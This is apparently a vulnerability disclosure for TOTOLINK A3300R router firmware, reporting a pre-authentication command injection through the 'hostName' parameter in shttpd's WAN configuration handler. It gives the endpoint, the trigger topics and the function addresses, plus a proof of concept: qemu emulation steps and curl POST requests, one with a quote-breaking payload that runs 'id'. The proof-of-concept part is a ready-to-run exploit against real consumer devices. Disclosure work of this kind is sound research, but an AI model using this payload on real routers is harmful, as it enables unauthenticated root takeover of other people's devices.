A3300R AC1200 雙頻Giga無線路由器 V17.0.0cu.557_B20221024 命令执行漏洞
固件包链接:
https://totolink.tw/support_view/A3300R
https://drive.google.com/file/d/1S8j9Kfa-TEJR0sBF5oZ_GyEiXtAbGKub/view?usp=drive_link

Description：
In the WAN configuration handling logic of shttpd, a pre-auth remote command injection was found, listed as VULN-01 in this report. The HTTP parameter `hostName` is directly concatenated into a shell command string without any filtering and executed via `doSystem()` (which internally uses `vsnprintf + system()`). We've fully reproduced it using qemu-mipsel dynamic emulation: a single POST request without being logged in is enough to execute arbitrary commands on the router with web service privileges (root on the actual device).

Details：
- Binary: /usr/sbin/shttpd
- CGI endpoint: POST /cgi-bin/cstecgi.cgi
- Request body format: Content-Type: application/json (Note: x-www-form-urlencoded will be treated as an unknown topic and return {"errmsg":"{}"}, must use JSON)
- Trigger topics: setWizardCfg or setWanCfg (both route to the WAN configuration handler containing the vulnerability)
- Vulnerable function: sub_422380 (address 0x00422380), called by sub_410470 (handles setWizardCfg) and sub_411CE0

Core logic：
<img width="1894" height="1502" alt="image" src="https://github.com/user-attachments/assets/281ac617-7b0f-424e-80c3-26aaf30e05f4" />
<img width="1496" height="1140" alt="image" src="https://github.com/user-attachments/assets/ef6b8a63-8cd4-4ed2-be97-548e87890448" />
<img width="2392" height="822" alt="image" src="https://github.com/user-attachments/assets/0c76b26c-2c52-4beb-969a-3723a06b15f3" />



Injection point: doSystem("echo '%s' > /proc/sys/kernel/hostname", v29)
doSystem is a helper function provided by the TOTOLINK shared library, and its operation is basically vsnprintf(buf, fmt, args); system(buf);. After %s is replaced with the raw value of hostName, the whole string is passed to /bin/sh -c for execution. The format string wraps %s in single quotes, but an attacker can put a single quote ' in hostName to close the original quotes and inject arbitrary shell metacharacters.


POC:
# 1. Start the simulation (inside Kali VM)
qemu-mipsel -L ./squashfs-root ./squashfs-root/usr/sbin/shttpd -root /web -ports 8080 &

# 2. Control group: benign hostName, should not trigger any command
curl -s -X POST http://127.0.0.1:8080/cgi-bin/cstecgi.cgi \
  -H 'Content-Type: application/json' \
  -d '{"topicurl":"setWizardCfg","proto":"1","hostName":"benign_control"}'

# 3. Attack group: break single quotes, inject id
curl -s -X POST http://127.0.0.1:8080/cgi-bin/cstecgi.cgi \
  -H 'Content-Type: application/json' \
  -d '{"topicurl":"setWizardCfg","proto":"1","hostName":"'"';id > /tmp/pwned;'"'}'

<img width="1666" height="332" alt="image" src="https://github.com/user-attachments/assets/ad2f26cd-60b7-4a62-92a9-7fa029456296" />
<img width="1366" height="1042" alt="image" src="https://github.com/user-attachments/assets/51829ae1-b4df-496d-96d0-d3b012f2877e" />
<img width="1516" height="758" alt="image" src="https://github.com/user-attachments/assets/0e4761a9-5fd0-4bfd-8f1a-f23d82b61412" />






